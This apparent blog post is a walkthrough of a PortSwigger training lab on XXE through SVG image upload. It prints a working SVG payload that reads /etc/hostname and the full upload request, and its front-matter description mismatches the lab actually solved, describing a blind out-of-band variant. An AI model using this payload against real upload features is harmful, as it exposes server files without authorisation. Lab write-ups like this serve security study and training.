---
author: Nithissh S
pubDatetime: 2024-11-22T15:22:00Z
modDatetime: 2024-11-22T09:12:47.400Z
title: Exploiting XXE via image file upload
slug: xxe-portswigger-lab-4
featured: false
draft: false
tags:
  - BSCP
  - XXE
description:
  This lab has a "Check stock" feature that parses XML input but does not display the result. You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain. To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
---

## Objective 

This lab lets users attach avatars to comments and uses the `Apache Batik library` to process avatar image files.

To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the `"Submit solution"` button to submit the value of the server hostname. 

## Solution 

In the add comment functionality, we have functionality to upload an avatar in it.. so what I did created a sample svg payload with a XXE

```xml 
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>
```

Then now I uploaded the avatar, entered some random input data with fields and here is how the request looks like 

```sh
POST /post/comment HTTP/2
Host: 0ae3005504821ddf8173482f00530041.web-security-academy.net
Cookie: session=kCubHHWI2AsgPEsAJ2jtREgDZ7lPkyY9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------281221630236770022421711560835
Content-Length: 1267
Origin: https://0ae3005504821ddf8173482f00530041.web-security-academy.net
Referer: https://0ae3005504821ddf8173482f00530041.web-security-academy.net/post?postId=5
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

-----------------------------281221630236770022421711560835
Content-Disposition: form-data; name="csrf"

q61g7AQxxt26b6WYtNE3LftMyLV4qn7x
-----------------------------281221630236770022421711560835
Content-Disposition: form-data; name="postId"

5
-----------------------------281221630236770022421711560835
Content-Disposition: form-data; name="comment"

test
-----------------------------281221630236770022421711560835
Content-Disposition: form-data; name="name"

test
-----------------------------281221630236770022421711560835
Content-Disposition: form-data; name="avatar"; filename="poc.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>

-----------------------------281221630236770022421711560835
Content-Disposition: form-data; name="email"

test@test.com
-----------------------------281221630236770022421711560835
Content-Disposition: form-data; name="website"

https://test.com
-----------------------------281221630236770022421711560835--
```

After posting the comment, avatar will be uploaded in particular path which will actually get discloses in `View source` page of posted comment 

![](../../assets/images/bscp/xxe/xxe-12.png)

Opening the uploaded avatar, reveals the `hostname` here 

![](../../assets/images/bscp/xxe/xxe-13.png)

Submit the hostname as a solution through `Submit solution` button and that solves the lab 

![](../../assets/images/bscp/xxe/xxe-14.png)